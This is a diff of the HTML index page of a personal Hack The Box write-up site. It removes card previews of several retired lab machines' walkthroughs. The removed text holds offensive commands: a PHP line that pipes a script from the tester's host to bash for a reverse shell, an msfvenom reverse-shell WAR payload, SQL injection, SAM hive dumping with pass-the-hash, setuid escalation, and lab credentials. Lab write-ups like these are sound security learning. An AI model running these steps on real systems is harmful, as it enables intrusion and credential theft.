@@ -1,629 +1,222 @@
 <!DOCTYPE html>
-<html lang="en-us">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    
-    <title>Hack The Box | Khonshu Writeups</title>
-    <meta name="viewport" content="width=device-width,minimum-scale=1">
-    <meta name="description" content="">
-    <meta name="generator" content="Hugo 0.158.0">
-    
-    
-    
-      <meta name="robots" content="noindex, nofollow">
-    
-    
+<html lang="en" dir="auto" data-theme="dark">
 
-    
-<link rel="stylesheet" href="/ananke/css/main.min.css" >
+<head><script src="/Kh0nshu/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=Kh0nshu/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hack The Box | Khonshu Writeups</title>
+<meta name="keywords" content="">
+<meta name="description" content="My Hack The Box writeups.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/Kh0nshu/hackthebox/">
+<link crossorigin="anonymous" href="/Kh0nshu/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/Kh0nshu/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/Kh0nshu/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/Kh0nshu/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/Kh0nshu/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/Kh0nshu/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/Kh0nshu/hackthebox/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/Kh0nshu/hackthebox/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
 
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
 
-
-
-    
-
-
-    
-      
-
-    
-
-    
-    
-      <link href="/hackthebox/index.xml" rel="alternate" type="application/rss+xml" title="Khonshu Writeups" />
-      <link href="/hackthebox/index.xml" rel="feed" type="application/rss+xml" title="Khonshu Writeups" />
-      
-    
-
-    
-      <link rel="canonical" href="http://localhost:1313/hackthebox/">
-    
-
-    
-    
-    <meta property="og:url" content="http://localhost:1313/hackthebox/">
-  <meta property="og:site_name" content="Khonshu Writeups">
-  <meta property="og:title" content="Hack The Box">
-  <meta property="og:description" content="My Hack The Box writeups.">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="website">
-
-  <meta itemprop="name" content="Hack The Box">
-  <meta itemprop="description" content="My Hack The Box writeups.">
-  <meta itemprop="wordCount" content="5">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Hack The Box">
-  <meta name="twitter:description" content="My Hack The Box writeups.">
-
-	
-  </head><body class="ma0 avenir bg-near-white development is-section is-section">
-    
-
-  <header>
-    <div class="pb3-m pb6-l bg-black">
-      <nav class="pv3 ph3 ph4-ns" role="navigation">
-  <div class="flex-l center items-center justify-between">
-    <a href="/" class="f3 fw2 hover-white white-90 dib no-underline">
-      
-        Khonshu Writeups
-      
-    </a>
-    <div class="flex-l items-center">
-      
-
-      
-        <ul class="pl0 mr3">
-          
-          <li class="list f5 f4-ns fw4 dib pr3">
-            <a class="hover-white white-90 no-underline" href="/android_malware/" title="Android Malware page">
-              Android Malware
-            </a>
-          </li>
-          
-          <li class="list f5 f4-ns fw4 dib pr3">
-            <a class="hover-white white-90 no-underline" href="/ctfs/" title="CTF page">
-              CTF
-            </a>
-          </li>
-          
-          <li class="list f5 f4-ns fw4 dib pr3">
-            <a class="hover-white white-90 no-underline" href="/hackthebox/" title="HackTheBox page">
-              HackTheBox
-            </a>
-          </li>
-          
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/Kh0nshu/" accesskey="h" title="Khonshu Writeups (Alt + H)">Khonshu Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/Kh0nshu/android_malware/" title="Android Malware">
+                    <span>Android Malware</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/Kh0nshu/ctfs/" title="CTFs">
+                    <span>CTFs</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/Kh0nshu/hackthebox/" title="HackTheBox">
+                    <span class="active">HackTheBox</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/Kh0nshu/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
         </ul>
-      
-      <div class="ananke-socials"></div>
-
-    </div>
-  </div>
-</nav>
-
-      <div class="tc-l pv3 ph3 ph4-ns">
-        <h1 class="f2 f-subheadline-l fw2 light-silver mb0 lh-title">
-          Hack The Box
-        </h1>
-        
-      </div>
-    </div>
-  </header>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="http://localhost:1313/Kh0nshu/">Home</a></div>
+  <h1>
+    Hack The Box
+  </h1>
+</header>
+<div class="post-content"><p>My Hack The Box writeups.</p>
 
 
-    <main class="pb7" role="main">
-      
-  <section class="mw8 center ph3 ph4-ns pv4">
-    <h1 style="font-size: 2rem; font-weight: 700; margin-bottom: 1rem;">
-      Hack The Box
-    </h1>
-
-    <p>My Hack The Box writeups.</p>
-
-
-    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:1rem; margin-top:1.5rem;">
-      
-        <a href="/hackthebox/retired-machines/boardlight-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              BoardLight (Linux Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>As usual, we run an nmap scan:
-<ul>
-<li>We find that we have 2 tcp ports open, ssh and http</li>
-</ul>
-</li>
-<li>First we open the website and look for the domain they are using to add to our /etc/hosts
-<ul>
-<li>We find board.htb</li>
-</ul>
-</li>
-<li>Now we play around with the website and look for something we can use to get in
-<ul>
-<li>There is a contact page input and Newsletter input</li>
-<li>They don&rsquo;t seem to reflect anything back to work with atm</li>
-</ul>
-</li>
-<li>Lets try some subdomain bruteforcing with gobuster
-<ul>
-<li><code>gobuster vhost -u http://board.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></li>
-<li>The &ndash;append-domain is important or it wont actually add the domain at the end to find the subdomains</li>
-<li>Now we a subdomain crm.board.htb</li>
-</ul>
-</li>
-<li>We add the subdomain to /etc/hosts and open it
-<ul>
-<li>we find a log in page running dolibarr 17.0.0</li>
-<li>first thing that comes to mind is trying some basic username and passwords
-<ul>
-<li>for some reason it logged me in  but doesn&rsquo;t give me access</li>
-<li>My session is apparently not authenticated, probably has to do with a token or a cookie in the request.</li>
-<li>Lets open burpsuite and see whats going on</li>
-<li>There is a token that gets sent with the post request</li>
-<li>let&rsquo;s just move on to looking for a cve since we conveniently have the version number anyways.</li>
-</ul>
-</li>
-<li>if that doesn&rsquo;t work we can look for cve&rsquo;s
-<ul>
-<li>found a cve that gives us a remote shell</li>
-</ul>
-</li>
-<li>found a  conf.php file that has a user and password
-<ul>
-<li>dolibarrowner</li>
-<li>serverfun2$2023!!</li>
-<li><code>mysql -u dolibarrowner -h 127.0.0.1 -P 3306 -p'serverfun2$2023!!'</code></li>
-<li>turns out im doing too much, and i should just check if they reuse this password for larissa user.</li>
-</ul>
-</li>
-<li>Then we look at the desktop environment being used
-<ul>
-<li>Which is Enlightenment, and the version found has a cve that we could use to escalate.</li>
-<li>Found a poc, downloaded it and ran it on the machine and it gave us root.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/cap-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Cap (Linux Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>Run an nmap scan</li>
-<li>found ftp, ssh and http ports open on the machine</li>
-<li>first I will try to access ftp and see if there is anything useful there
-&ndash; so turns out that i cant log into anonymous on ftp</li>
-<li>I tried sqlmap to test for sql injections, doesnt seem like it</li>
-<li>now using gobuster to look for directories i can access</li>
-<li>I got stuck</li>
-</ul>
-<h2 id="answer">answer</h2>
-<ul>
-<li>test around the website and change the id on /data/[id]</li>
-<li>get the past pcap files and look through for credentials</li>
-<li>found credentials</li>
-<li>use it to log through ftp and ssh</li>
-<li>user.txt</li>
-<li>now its time for privilege escalation</li>
-<li>we download linpeas.sh script that looks for ways to escalate privileges in linux</li>
-<li>run a python server</li>
-<li>curl the file and pipe it into bash</li>
-<li>we found &lsquo;Files with capabilities (limited to 50):
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip&rsquo;</li>
-<li>they gave this file permissions so that they can run administrative functions like netstat on the http server</li>
-<li>now we just need to run that version of python and give it commands to give us root</li>
-<li><code>import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)</code></li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/cicada-windows-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Cicada (Windows Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>As usual run a full nmap scan of the machine
-<ul>
-<li>we find an overwhelming 13 ports open</li>
-<li>This is the first time I&rsquo;ve encountered so many open ports on a machine</li>
-<li>The interesting ones seem to be 3 Active Directory ports open, there is an http port open too</li>
-</ul>
-</li>
-<li>So apparently smb has anonymous login enabled and there is a fileshare &ldquo;HR&rdquo; that can be accessed
-<ul>
-<li>It has a default password notice to change</li>
-<li>so now our goal is to find the user who hasn&rsquo;t yet changed his default password.</li>
-<li>The question is how do we find the username?
-<ul>
-<li>Which service can we look through to find usernames on a server</li>
-<li>Apparently there is this thing called impacket and we can use it&rsquo;s lookupsid to find possible usernames</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="new-tool-learned">New Tool Learned</h2>
-<ul>
-<li><strong>crackmapexec</strong> : a tool to automate enumerating domains (including users, files/directories, and shares). <strong>This tool is GOATED for Windows Machines!!</strong>
-<ul>
-<li>Can also brute force with supplied credentials or dump usernames and hashed passwords in active directory environments.</li>
-</ul>
-</li>
-<li><strong>Impacket&rsquo;s lookupsid</strong> : a tool that will try brute forcing windows security identifiers (SID) of any users in the AD domain.
-<ul>
-<li><code>impacket-lookupsid '10.10.11.35/guest'@10.10.11.35 -no-pass</code></li>
-<li>That shows all the users on the AD</li>
-</ul>
-</li>
-</ul>
-<h2 id="now-back-to-the-problem">Now back to the problem</h2>
-<ul>
-<li>Now that we have a list of users, we want to use crackmapexec to brute force test them with the default password we found. (Also known as <strong>Password Spraying Attack</strong>)</li>
-<li>We find the user &lsquo;michael.wrightson&rsquo; still using the default password.</li>
-<li>Problem is that this user doesn&rsquo;t have any permission to open of the smb file shares.
-<ul>
-<li>So we run <code>crackmapexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users</code> to find other users</li>
-<li>we happen to find a user  that put his password in his description in case he forgets it.
-<ul>
-<li>User: david.orelious Password:aRt$Lp#7t*VQ!3</li>
-<li>now we run <code>crackmapexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares</code> to see what shares this user has access to</li>
-</ul>
-</li>
-<li>He has access to the DEV share as READ</li>
-<li>Which has a backup script with a username and password saved in plaintext.</li>
-<li>User: emily.oscars Password:Q!3@Lp#M6b<em>7t</em>Vt</li>
-<li>This user has permission to read and write to default share and read the remote admin share.</li>
-</ul>
-</li>
-<li>Now we need to check if we can connect using emily.oscars through evil-winrm to get a remote shell.
-<ul>
-<li>Which yes it works (Here we navigate to desktop and <strong>get the user flag</strong>)</li>
-</ul>
-</li>
-</ul>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<ul>
-<li>So now we check what privileges we have using <code>whoami /priv</code></li>
-<li>So we see that this user has <code>SeBackupPrivilege</code>, which is typically given to either service or admin accounts. Meaning that it allows us access to system protected files.</li>
-<li>The files we are most interested in are System and Sam windows registry hives. Which should have what we need to escalate our privileges.
-<ul>
-<li>SAM(Security Account Manager) hive: has local user account and group info, including their hashed passwords.</li>
-<li>System hive:  has system config settings, like the system boot key which is used to decrypt the password hashes in SAM</li>
-</ul>
-</li>
-<li>use <code>reg save hklm\[sam/system] [sam/system]</code> to copy those 2 registries to 2 files in the current directory.</li>
-<li>Now we use &lsquo;Impacket&rsquo;s secretsdump&rsquo; to make it dump the user NTLM hashes, which we can use the pass-the-hash attack
-<ul>
-<li>`impacket-secretsdump -sam sam -system system local</li>
-<li>Now we have the Administrator hash</li>
-</ul>
-</li>
-<li>Log in through evil-winrm <code>evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35</code></li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/devvortex-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Devvortex (Linux Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>so this has ssh and http open</li>
-<li>i tried some very basic sql injection into the contact us and the subscribe but it doesnt seem to do much</li>
-<li>tried gobuster for subdomains or directories and found nothing</li>
-</ul>
-<h2 id="answer">ANSWER</h2>
-<ul>
-<li>so I needed to make sure to add <code>--append-domain</code> to gobuster at the end to actually make it look for subdomains</li>
-<li>Then we found dev.devvortex.htb, so we add it to /etc/hosts so that it&rsquo;s mapped to the same ip</li>
-<li>then when we access it we find out it&rsquo;s using Joomla for its CMS (content management system like wordpress)</li>
-<li>We find out that for joomla there is a certain path to add /api/something somethign (looked it up), and it shows you the version that is being used.</li>
-<li>We look up the version and the cve&rsquo;s that it has, and we find a information disclosure vulnerability.
-<ul>
-<li>You can add a path in the link and find the users and passwords</li>
-</ul>
-</li>
-<li>Then we are able to access that administrator page through lewis&rsquo;s admin privaleges</li>
-</ul>
-<h3 id="remote-shell">Remote Shell</h3>
-<ul>
-<li>we can open a python server on our machine with a shell in the  same folder</li>
-<li>we can edit the templates php files to make it connect to our python server and pass the shell script</li>
-<li><code>&lt;?php system(&quot;curl 10.10.14.3:1234/rev.sh | bash&quot;); ?&gt;</code></li>
-<li>we open netcat on the port that we specified and</li>
-<li>run <code>ss -tlpn</code>, which is socket statistics (like netstat). t shows tcp, l shows listening, p shows show the process  name and PID, n shows ports in numeric form</li>
-<li>we see that ports 3306 and 33060 are open which usually use mysql</li>
-<li>we see that in configuration.php the user lewis still uses the same password on the sql server so we log in</li>
-<li>we list users and their passwords</li>
-<li>run hashid &lsquo;hash&rsquo; to figure out the type of has to put into hashmode in hashcat or just run hashcat with no mode and it ill tell you the most likely modes</li>
-<li>hashcat -m [hashmode] -a [attack mode, usually 0] hash.txt /usr/share/wordlists/rockyou.txt</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/driver-windows-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Driver (Windows Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>As usual we will be running an nmap scan to start first</li>
-<li>It has a bunch of open ports, port 80, 445, and 5985 stand out
-<ul>
-<li>80 and 5985 are running http</li>
-<li>445 is smb</li>
-<li>135 is running msrpc, which you could send it a function to run and tell you the result</li>
-</ul>
-</li>
-<li>First lets check the http ports
-<ul>
-<li>it prompts asking for a password and username, &ldquo;admin admin&rdquo; works.</li>
-<li>It&rsquo;s a firmware update center</li>
-<li>You can upload a file and the website runs on php
-<ul>
-<li>possible reverse shell?</li>
-</ul>
-</li>
-<li>has the domain driver.htb so lets add that to /etc/hosts</li>
-</ul>
-</li>
-<li>The nmap script says that it was able to connect to smb as a guest account so let&rsquo;s see what we can find
-<ul>
-<li>for some reason i can&rsquo;t log in as guest</li>
-</ul>
-</li>
-<li>There has to be something that we can do with the firmware updates page to upload some sort of malicious file.
-<ul>
-<li>uploading php reverse shell doesn&rsquo;t work because its not executing it</li>
-<li>apparently the files you upload get sent to their smb</li>
-</ul>
-</li>
-</ul>
-<h2 id="learned">Learned</h2>
-<ul>
-<li>smb share scf file attack
-<ul>
-<li>you upload an scf file with specific commands</li>
-<li>run <code>responder -I tun0</code></li>
-<li>get the NTLM hash of the user</li>
-</ul>
-</li>
-<li>When you have credentials use evil-winrm to connect to windows remote management (WinRM)
-<ul>
-<li><code>evil-winrm -i {ip} -u {user} -p 'password'</code></li>
-</ul>
-</li>
-<li>Apparently there is a file that shows the powershell history of the user</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/goodgames-linux-not-so-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              GoodGames (Linux NOT So Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>so I&rsquo;ve been messing around this website for a while and trying sql injection techniques i know and nothing has been working.</li>
-<li>When i got frustrated i checked the machine info and it says that it has an sql injection vulnerability so I&rsquo;m going to have to go through the walkthrough to understand</li>
-<li>I tried looking up Union-Based SQL injections but still</li>
-</ul>
-<h2 id="answer">Answer</h2>
-<ul>
-<li>I guess i was overthinking it, you just had to do <code>admin' or 1=1 #</code></li>
-<li>then save the request from burpsuite in a txt file</li>
-<li>And run it through sqlmap <code>sqlmap -r request.txt --dbs</code> this will make it list databases it finds</li>
-<li>So we found 2 (main and information_schema)</li>
-<li>when we look further using <code>sqlmap -r request.txt --tables -D main</code> we find a users table in the main database</li>
-<li>Then we log into admin account and find a way to get into internal administration subdomain when we click on settings</li>
-<li>There is a way for you to change your name so we input {{7*7}} and it returns 49 as our name so its vulnerable to SSTI</li>
-<li>When we find that out we can create a reverse shell payload and input it encoded in base64 ( you&rsquo;ll have to figure out how the backend is configured in this case python 3.8.7 and then find a payload that works on python and make it run your command piped into base64 to decode it)</li>
-</ul>
-<h4 id="privilege-escalation">Privilege Escalation</h4>
-<ul>
-<li>we run ls -la and we get UID 1000 instead of the name of the user Augustus, so we know we are in a docker, a sandbox for the application</li>
-<li>checking mount shows us that its mounted with rw permissions</li>
-<li>we check our ip and its 172.19.0.2, because docker usually assigns the first address to the host</li>
-<li>we can use bash instead of nmap to check open ports <code>for PORT in {0..1000}; do timeout 1 bash -c &quot;&lt;/dev/tcp/172.19.0.1/$PORT &amp;&gt;/dev/null&quot; 2&gt;/dev/null &amp;&amp; echo &quot;port $PORT is open&quot;; done</code></li>
-<li>we find ssh is open, we log in with the same password we  found earlier for the admin to the agustus user and it works</li>
-<li>the user directory is mounted on the docker, so we can make a file in host and change the persmission in the container</li>
-<li>we copy bash  and we go back to the root in the docker and run <code>chown root:root bash</code> and <code>chmod 4755 bash</code></li>
-<li>now we go back through ssh and we run ./bash -p and we have root</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/jerry-windows-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Jerry (Windows Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>nmap scan shows that port 8080 is open with Apache Tomcat/7.0.88 running on it</li>
-<li>we look through the webpage</li>
-<li>open server status and we put in admin admin and it works</li>
-<li>then i look at the response in burpsuit and it has a username tomcat and password s3cret</li>
-<li>I found authorization tag in the html post requests</li>
-<li>it had base64 encoding of admin:admin, so i encoded tomcat:s3cret and input it and now i have access to the manager</li>
-<li>i found a upload file and deploy button</li>
-</ul>
-<h2 id="exploitation">Exploitation</h2>
-<ul>
-<li>first thing that comes to mind is to create a shell file to connect back to my machine to get a reverse shell</li>
-<li>it needs war files so we can run msfvenom to make one <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your_tun0_ip&gt; LPORT=4444 -f war -o shell.war</code></li>
-<li>Then open website/shell, and boom you have a reverse shell (this gets you user and root.txt)</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/paper-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Paper (Linux Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>So we run an nmap scan and find out that ssh, http, and https are open</li>
-<li>we open the site on firefox and its just an http server test page</li>
-<li>I tried looking around for anything hidden or looking for vulnerabilities in the appache version</li>
-<li>Found the domain in an http request</li>
-<li>Then got the real website and found the version of word press</li>
-<li>used a cve that shows private unpublished drafts</li>
-<li>which got me access to the company chat</li>
-<li>There is a bot that I used to get it&rsquo;s own configuration file and it gave me the password to a user on the machine that i logged into</li>
-</ul>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<ul>
-<li>So apparently there is a program called polkit that acts as the middle man to check if you have permission
-<ul>
-<li>If you have permission it lets you do what you want, if not should we ask root, or just  say no.</li>
-</ul>
-</li>
-<li></li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/sau-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Sau (Linux Easy)
-            
-          </h2>
-
-          
-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>So we run an nmap scan as usual</li>
-<li>we have 2 open ports (22, ssh and 55555 unknown), and we have 2 filtered ports (80 http, and 8338 unknown)</li>
-<li>lets try accessing port 80 from the browser
-<ul>
-<li>Didnt work</li>
-</ul>
-</li>
-<li>Now lets try accessing port 55555 to know whats on there
-<ul>
-<li>We find a basket website powered by request-baskets</li>
-</ul>
-</li>
-<li>We have  <a href="https://github.com/darklynx/request-baskets">request-baskets</a> | Version: 1.2.1 so we can look for vulnerabilities in that software</li>
-<li>So we find the fact that we can reroute when someone clicks on the link somewhere else, and we can use that to trick the machine into opening the filtered port 80</li>
-</ul>
-<h2 id="exploitation">Exploitation</h2>
-<ul>
-<li>now we opened port 80, and we find it running some software</li>
-<li>we look up vulnerablilities for that software and find an exploit ready to use</li>
-<li>we use it and it give us a reverse shell into the machine</li>
-</ul>
-<h2 id="escalation">Escalation</h2>
-<ul>
-<li>so we run sudo -l to check our privalages and we find out we can run systemctl in sudo without password</li>
-<li>and we look up systemctl vulnerabilities</li>
-<li>turns out that when you run it, if the output is too much it will run it through less  with root permission</li>
-<li>so we can run commands through less to get bin/bash as root</li>
-</ul>
-            </p>
-          
-        </a>
-      
-        <a href="/hackthebox/retired-machines/writeup-linux-easy/" style="display:block; width:100%; min-width:0; max-width:100%; padding:1rem; border:1px solid #ddd; border-radius:12px; text-decoration:none; color:inherit; box-sizing:border-box; overflow:hidden;">
-          <h2 style="display:block; width:100%; max-width:100%; margin:0 0 0.5rem 0; font-size:1.25rem; font-weight:700; line-height:1.3; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-            
-              Writeup (Linux Easy)
-            
-          </h2>
-
-          
